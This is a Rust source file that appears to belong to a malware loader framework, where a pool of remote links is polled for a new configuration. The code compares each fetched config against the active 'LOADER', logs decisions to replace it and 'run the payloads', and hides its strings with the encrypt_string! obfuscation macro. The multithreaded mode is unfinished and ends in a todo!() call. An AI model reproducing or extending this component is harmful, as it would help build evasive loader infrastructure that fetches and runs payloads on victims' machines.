use crate::link::Link;
use crate::link::LinkFetch;
use log::info;
use log::warn;
use serde::{Deserialize, Serialize};

use crate::config::Config;
use cryptify::encrypt_string;

use anyhow::bail;
use std::thread;

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub enum PoolMode {
    ONEBYONE,
    TOGETHER,
}
//TODO il faut ajouter aussi des modes de choix, pourcentage de liens valides etc...
//TODO,il faudra rajouter la date de création dans la config pour comparer si plusieurs conf différentes trouvées dans un pool

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct PoolLinks {
    pub pool_links: Vec<Link>,
    pub pool_mode: PoolMode,
}

impl PoolLinks {
    pub fn update_pool(&self, config: &Config) -> Result<Config, anyhow::Error> {
        match &self.pool_mode {
            PoolMode::ONEBYONE => self.update_links_onebyone(config),
            PoolMode::TOGETHER => self.update_links_together(config),
        }
    }

    pub fn update_links_onebyone(&self, config: &Config) -> Result<Config, anyhow::Error> {
        let mut link_nb: i32 = 0;
        for link in &self.pool_links {
            link_nb = link_nb + 1;
            info!(
                "{}/{}{}{:?}",
                link_nb,
                &self.pool_links.len(),
                encrypt_string!(" Link: "),
                &link.get_target()
            );

            let newconf: Config = match link.fetch_config(&config) {
                Ok(newconf) => newconf,
                Err(error) => {
                    warn!("{}{}", encrypt_string!("error: "), error);
                    continue;
                }
            };
            //nex time its here

            if config.is_same_loader(&newconf) {
                info!("{}", encrypt_string!("same config: Yes"));
                info!(
                    "{}",
                    encrypt_string!(
                        "[+] DECISION: keep the same active LOADER, and run the payloads"
                    )
                );
                bail!("{}", encrypt_string!("Found same loader"))
            }
            warn!("{}", encrypt_string!("same config: No"));
            info!(
                "{}",
                encrypt_string!(
                    "[+] DECISION: replace the active LOADER by this one, and run the payloads"
                )
            );
            return Ok(newconf);
        }
        bail!("{}", encrypt_string!("NOconfigfound"))
    }

    // doc: https://nickymeuleman.netlify.app/blog/multithreading-rust
    pub fn update_links_together(&self, config: &Config) -> Result<Config, anyhow::Error> {
        
        let mut handle_list: Vec<thread::JoinHandle<Config>> = vec![];
        let pool_link= &self.pool_links;
        let pool_link_len= pool_link.len();

        let mut link_nb: i32 = 0;
        for link in pool_link {
            link_nb = link_nb + 1;
            info!(
                "{}/{}{}{:?}",
                link_nb,
                &pool_link_len,
                encrypt_string!(" Link: "),
                &link.get_target()
            );
            let thread_link=link.clone();
            let thread_config=config.clone();
            let handle: thread::JoinHandle<Config> = thread::spawn(move || {
                info!("thread begin {}",link_nb);
                //TODO pas de unwrap ici, faire un jolie message de crash
                let newconfig= thread_link.fetch_config(&thread_config).unwrap();
                info!("thread end {}",link_nb);
                newconfig
            });
            handle_list.push(handle);

        }
        info!("all thread run, wait to join");
        //let mut handle_nb: i32 = 0;

        let mut config_list: Vec<Config> = vec![];
        for handle in handle_list {
            let newconfig= handle.join().unwrap();
            config_list.push(newconfig);
        }

        for conf in config_list{
            info!("VICTORY! {:?}",conf);
        }
        info!("CRASH now");
        todo!()
    }
}

//use std::time::Duration;
